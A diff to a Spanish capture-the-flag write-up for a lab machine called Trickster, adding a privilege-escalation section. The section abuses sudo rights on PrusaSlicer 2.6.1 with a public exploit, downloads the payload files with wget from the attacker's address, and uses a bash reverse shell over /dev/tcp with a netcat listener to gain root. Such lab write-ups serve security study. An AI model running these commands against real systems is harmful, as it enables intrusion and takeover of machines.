@@ -17,10 +17,12 @@ image: https://github.com/user-attachments/assets/68c7e29e-5394-442f-b624-df3200
 * Abusing PrestaShop 8.1.5 XSS to RCE (CVE-2024-34716)
 * Information lekeage
 * Cracking hashes (hashcat)
-* Internal Host Discovery Docker Container (bash script)
-* Internal Port Discovery Docker Container (netcat)
+* Internal Host Discovery Docker Container
+* Internal Port Discovery Docker Container
 * SSH Local Port Forwarding
-* Abusing STTI to RCE in ChangeDetection v0.45.20
+* Abusing ChangeDetection 0.45.20 STTI to RCE (CVE-2024-32651)
+* Lateral Movement to adam via Information Lekeage (Brotli file)
+* Abusing sudo privileges in PrusaSlicer 2.6.1 RCE (CVE-2023-47268 )
 
 ## Enumeration
 
@@ -745,4 +747,111 @@ adam@trickster:~$ whoami
 adam
 ```
 
-###
+### Privilege escalation
+
+Utilizo el comando sudo -l para visualizar los binarios que puede ejecutar con privilegios elevados, observo que tengo permiso para ejecutar prusaslicer sin necesidad de proporcionar contraseña.
+
+```bash
+adam@trickster:~$ sudo -l
+Matching Defaults entries for adam on trickster:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User adam may run the following commands on trickster:
+    (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
+```
+
+Buscando información observo que PrusaSlicer es un software de código abierto para preparar modelos 3D para impresión en impresoras 3D de tipo FDM y SLA. Ejecuto prusaslicer --version y obtengo un error que me indica que no se conoce el comando pero aun así consigo ver la versión, la cual es 2.6.1
+
+```bash
+adam@trickster:~$ sudo /opt/PrusaSlicer/prusaslicer --version
+Unknown option --version
+PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
+https://github.com/prusa3d/PrusaSlicer
+```
+
+> Sabiendo que es PrusaSlicer y que la versión es 2.6.1 puedo buscar información sobre posibles vulnerabilidades existentes
+{: .prompt-info }
+
+Una pequeña búsqueda me permite dar con un repositorio de Github dond se explican a la perfección los pasos a seguir para explotar la ejecución remota de comandos.
+
+* [PrusaSlicer Arbitrary Code Execution](https://github.com/suce0155/prusaslicer_exploit)
+
+El primer paso es clonar el repositorio en la máquina de atacante
+
+```bash
+git clone https://github.com/suce0155/prusaslicer_exploit
+```
+
+El siguiente paso es montar un servidor en Python3 y transferir los archivos exploit.sh y evil.3mf
+
+```bash
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```bash
+adam@trickster:/tmp$ wget http://10.10.14.197:8000/exploit.sh
+--2025-02-02 22:44:29--  http://10.10.14.197:8000/exploit.sh
+Connecting to 10.10.14.197:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 42 [text/x-sh]
+Saving to: ‘exploit.sh’
+```
+
+```bash
+adam@trickster:/tmp$ wget http://10.10.14.197:8000/evil.3mf
+--2025-02-02 22:44:16--  http://10.10.14.197:8000/evil.3mf
+Connecting to 10.10.14.197:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 39455 (39K) [application/vnd.ms-3mfdocument]
+Saving to: ‘evil.3mf’
+```
+
+Hay que modificar el archivo exploit.sh que es una reverse shell en Bash, donde indico mi ip y el puerto por el que quiero entablar la reverse shell, en este caso el 4444.
+
+```bash
+adam@trickster:/tmp$ cat exploit.sh 
+/bin/bash -i >& /dev/tcp/10.10.14.197/4444 0>&1
+```
+
+Asigno permisos de ejecución al script exploit.sh
+
+```bash
+adam@trickster:/tmp$ chmod +x exploit.sh
+```
+
+Inicio un listener con netcat por el puerto 4444 para obtener la reverse shell
+
+```bash
+nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+Ejecuto prusaslicer con privilegios sudo y cargo el archivo malicioso evil.3mf
+
+```bash
+adam@trickster:/tmp$ sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf
+10 => Processing triangulated mesh
+20 => Generating perimeters
+30 => Preparing infill
+45 => Making infill
+65 => Searching support spots
+69 => Alert if supports needed
+print warning: Detected print stability issues:
+
+EXPLOIT
+Low bed adhesion
+
+Consider enabling supports.
+Also consider enabling brim.
+88 => Estimating curled extrusions
+88 => Generating skirt and brim
+90 => Exporting G-code to EXPLOIT_0.3mm_{printing_filament_types}_MK4_{print_time}.gcode
+```
+
+Automaticamente obtengo la reverse shell y consigo escalar mis privilegios a root
+
+```bash
+root@trickster:/tmp# whoami
+root
+```
